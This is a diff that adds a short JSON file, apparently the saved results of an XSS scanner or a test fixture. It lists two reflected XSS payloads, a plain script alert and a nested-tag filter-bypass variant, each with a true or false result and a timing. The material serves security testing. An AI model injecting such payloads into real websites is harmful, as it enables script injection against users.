@@ -1,0 +1,13 @@
+{
+  "message": "Reflected XSS",
+  "data": [
+    {
+      "payload": "<script>alert('XSS')</script>",
+      "data": "[{\"result\":true,\"payload\":\"<script>alert('XSS')</script>\"}]\nDone in 5.28s.\n"
+    },
+    {
+      "payload": "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
+      "data": "[{\"result\":false,\"payload\":\"<scr<script>ipt>alert('XSS')</scr<script>ipt>\"}]\nDone in 3.95s.\n"
+    }
+  ]
+}
